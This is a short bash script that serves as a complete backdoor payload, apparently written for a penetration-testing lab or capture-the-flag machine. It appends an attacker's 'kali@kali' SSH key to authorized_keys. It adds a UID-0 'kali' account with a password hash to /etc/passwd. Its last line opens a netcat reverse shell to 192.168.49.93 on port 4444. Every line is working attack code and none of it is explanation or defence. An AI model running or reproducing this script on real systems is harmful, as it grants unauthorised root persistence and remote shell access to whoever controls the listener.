#!/bin/bash

touch /tmp/timmytest
mkdir ~/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4wFzBcLCaWI58px1q86SiR7OcJkeYTlDTwpp3DjWg2ovlAe2pJLv0o87I0NUfNbnnMUxWoQUp6mI8OeNIM/JKKhburEtKX399h/4k07DRiiKS5hfAD5o2iuOQWs3FTKcTG2jRVRNbK6fI2SWYvNKkVmcBypiuVqbGHEYTu72p7nOT0CEQJs3/P1wCLi6w+F19XUsIKCCmF/+6unYgcB94LA+psqkD2wOt20CxpwleHDAmXEvuRjSzRRaIpF5qbpAX/RUu23MB4ey9QjiO1n6I2zvR9Ir/+pPYAsgUdkZ4mdjbSTZmuJB0eSlPgvZX5UpC/4v2X8Qq38KvHDFsop8jC/4mFJ+PtOe7lVA6RYPlZQDXfee9CS80iXleFKS478c40rXaltww2q+iYEw8Rbh40AJGaMnFxQ1szyAO2pk93ryItVS3rWqJF488S5fkeVjYhBVV1sHcXhUlsI5Oy7W9uipi9ogPxOnJwlXFRYRZ92rlYQnBT+JyjLvpT1C4SOU= kali@kali' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo 'kali:$6$irbaKgZA08Nkvl/Z$IjChNZzrw1gt8D25jMGq7RoGV5uUxaVpc1ZxWGkGaqPZEi29iEb5iOLWg.dLQM.MkZUh9k9kFPlSjd6edBTTU1:0:0:root:/root:/bin/bash' >> /etc/passwd
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.93 4444 >/tmp/f